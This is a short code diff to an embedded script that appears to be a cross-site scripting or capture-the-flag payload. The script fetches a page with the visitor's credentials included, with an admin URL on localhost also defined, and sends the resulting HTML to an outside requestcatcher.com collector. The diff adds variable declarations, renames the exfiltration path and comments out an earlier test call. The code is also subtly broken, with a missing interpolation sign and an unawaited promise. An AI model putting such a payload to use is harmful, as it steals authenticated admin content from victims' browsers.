@@ -26,14 +26,14 @@ function getData(url) {
 }
 
 async function getRealData() {
-  AdminUrl = "http://127.0.0.1:1337/admin";
-  testurl = "https://m1ra1b0t.github.io/";
+  const AdminUrl = "http://127.0.0.1:1337/admin";
+  const testurl = "https://m1ra1b0t.github.io/";
   const response =  await fetch(testurl, {credentials: 'include',});
   const adminHtml = response.text();
   // Usage example
-  fetch(`https://wecando.requestcatcher.com/data//{encodeURIComponent(adminHtml)} `);
+  fetch(`https://wecando.requestcatcher.com/adminhtml/{encodeURIComponent(adminHtml)}`);
 }
-getData('https://wecando.requestcatcher.com/data');
+//getData('https://wecando.requestcatcher.com/data');
 getRealData();
 
 </script>
